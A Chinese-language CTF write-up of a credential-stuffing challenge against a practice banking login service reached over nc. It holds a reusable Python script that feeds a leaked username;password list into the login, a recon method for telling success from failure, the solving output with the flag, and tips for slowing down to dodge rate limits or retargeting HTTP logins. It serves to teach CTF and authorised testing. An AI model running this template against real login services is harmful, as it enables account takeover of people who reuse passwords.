# Credential Stuffing — Writeup ＆ 網路服務自動化模板
 
> 賽事：CyLab Academy（picoCTF 2026 風格）
> 類別：**Web Exploitation**（認證 / 自動化攻擊）
> Flag：`academy{d0nt_r3u5e_cr3d3nt1als_bf0ae95e}`
> 有效帳密：`sarita ; common`
 
---
 
## TL;DR
 
給一包外洩的帳密字典（1500 組 `username;password`），目標是一個 `nc` 登入服務。寫腳本把每組帳密灌進去，找到「有人在這也重用」的那一組 → 拿 flag。核心技能：**偵查協定 → 找成功/失敗 oracle → 寫自動化腳本**。
 
---
 
## 🎯 可複用 SOP：遇到「nc 網路服務」題（最重要，先記這段）
 
下次看到 `nc host port` 類的題（登入爆破、credential stuffing、互動式服務），照這五步走，快很多：
 
### Step 1：手動連一次，看懂「協定」
 
```bash
nc host port
```
觀察：
- 它**先說什麼**？（banner、提示格式）
- 它**要你輸入什麼**？分開問（`Username:` → `Password:`）還是一行？
- 手動試**一組正常值** + **一組亂值**，看回應。
> **心法：你不能自動化一個你還沒看懂的東西。**
 
### Step 2：找「成功 vs 失敗」的 oracle
 
- 失敗長怎樣？（這題：`Invalid username or password`）
- 成功長怎樣？（通常是 `Welcome` / 給 flag / 進選單）
- **兩者的差異就是腳本判斷「中了沒」的依據。**
### Step 3：測「一條連線能試幾次」
 
```bash
printf 'a\nb\nc\nd\n' | nc host port
```
送兩組假帳密，數失敗訊息：
- **出現 2 個失敗訊息** → 服務會循環 → 一條連線灌完全部（快）
- **只出現 1 個就斷** → 一次一組 → 每組重連（慢，但這題就是這種）
### Step 4：寫腳本自動灌（模板見下）
 
### Step 5：用 oracle 判斷，中了就停
 
---
 
## 🧰 可複用腳本模板（改 4 個地方就能用）
 
```python
import socket
 
# ===== 改這裡 =====
HOST, PORT = "chatelaine.cylabacademy.net", 29143   # 1. 目標
CREDS      = "creds-dump.txt"                        # 2. 字典檔
FAIL_MARK  = b"Invalid"                              # 3. 失敗訊息關鍵字
OK_MARK    = b"Welcome"                              # 4. 有連上的確認字（防誤判）
# ==================
 
def attempt(u, p):
    s = socket.socket(); s.settimeout(5)
    try:
        s.connect((HOST, PORT))
        s.sendall(u.encode() + b"\n" + p.encode() + b"\n")  # 送帳號+密碼
        r = b""
        while True:
            c = s.recv(4096)
            if not c: break        # 伺服器關連線 → 收完了
            r += c
        return r
    finally:
        s.close()
 
for line in open(CREDS):
    line = line.strip()
    if ";" not in line:
        continue
    u, p = line.split(";", 1)
    r = attempt(u, p)
    if OK_MARK in r and FAIL_MARK not in r:   # 有連上 且 沒失敗 → 中了
        print("\n[+] FOUND:", u, ";", p)
        print(r.decode(errors="replace"))
        break
    print(u, end="\r")                        # 進度（覆蓋同一行）
```
 
**換題目時只改最上面 4 個變數**：目標、字典、失敗關鍵字、連上確認字。其餘不動。
 
> 小技巧：
> - 這題是「一次一組、每組重連」，所以每次 `socket()` 重新連。若服務會**循環**，改成一條連線裡 for 迴圈送多組，快超多。
> - `OK_MARK`（Welcome）用來**防誤判**：如果 port 錯、連不上回傳空字串，`FAIL_MARK not in b""` 會是 True 造成假中獎；多檢查「有沒有連上的 banner」就安全。
 
---
 
## 這題的實際過程
 
### 偵查
 
```
=========================================
Welcome to the Online Banking Service!
=========================================
Please enter your username & password to login.
Username: <送帳號>
Password: <送密碼>
Invalid username or password          ← 失敗 oracle
```
 
測循環：`printf 'aaa\nbbb\nccc\nddd\n' | nc ...` → 只有 1 個 `Invalid` → **一次一組，要重連**。
 
### 跑腳本
 
```
[+] FOUND: sarita ; common
...
Welcome sarita!
academy{d0nt_r3u5e_cr3d3nt1als_bf0ae95e}
```
 
成功回應是 `Welcome sarita!` + flag（沒有 `Invalid`），正好被 `OK_MARK/FAIL_MARK` 判斷抓到。
 
---
 
## ⚙️ 環境設定備忘（這次踩的坑，下次省時間）
 
這題卡最久的其實是環境，不是題目本身。記下來下次不卡：
 
### 最小環境沒有編輯器 → 用 cat 寫檔
 
```sh
cat > stuff.py << 'PYEOF'
<貼你的程式碼>
PYEOF
```
`<< 'PYEOF'`（單引號）讓內容原封不動寫入，不會被 shell 亂解析。
 
### 沒有 python → 自己裝
 
```sh
# 自動判斷系統裝 python（Alpine 用 apk、Debian/Ubuntu 用 apt）
(apk add python3 || (apt-get update && apt-get install -y python3)) 2>&1 | tail -3
python3 --version
```
 
### port 會換
 
CTF instance 重啟後 **host/port 常常變**。腳本「神秘地沒結果」最常見原因就是 port 舊了。跑之前先手動驗證目標活著：
```sh
printf 'aaa\nbbb\n' | nc host port   # 有看到 banner = 活的
```
 
---
 
## 常見變形（下次可能長不一樣，怎麼調）
 
| 變形 | 怎麼改 |
|------|--------|
| 服務**會循環**（一條連線可一直試） | 改成一條連線裡迴圈送，不要每次重連 → 快 10 倍 |
| 輸入是**一行 `user;pass`** | `s.sendall(line.encode()+b"\n")`，不用拆 |
| 成功訊息不同 | 改 `FAIL_MARK` / `OK_MARK` |
| 有 **rate limit**（擋太快） | 每次之間 `time.sleep(x)`，或降低頻率 |
| 只需要**猜密碼**（帳號固定） | 字典換成純密碼表，帳號寫死 |
| HTTP 登入（不是 nc） | 改用 `requests.post(url, data={...})`，判斷回應差異 |
 
---
 
## 帶走的心法
 
| 心法 | 這題怎麼用 |
|------|-----------|
| **先偵查再自動化** | 看懂協定（分開問？會循環？）才動手寫，不白做 |
| **Errors are Oracles** | 用失敗訊息的「有/無」當成功判斷開關 |
| **防誤判要雙重確認** | 「沒失敗」不等於「成功」，再加一個「有連上」確認 |
| **環境先打通** | 沒編輯器用 cat、沒 python 自己裝、port 先驗證 |
 
> **核心：這類題的速度 = 偵查清楚 + 一套現成腳本模板。把這份模板存好，下次只改 4 個變數就能開打。**
 
---
 
*授權用途：CTF 學習 / 授權滲透測試 / 自己的機器。*
 
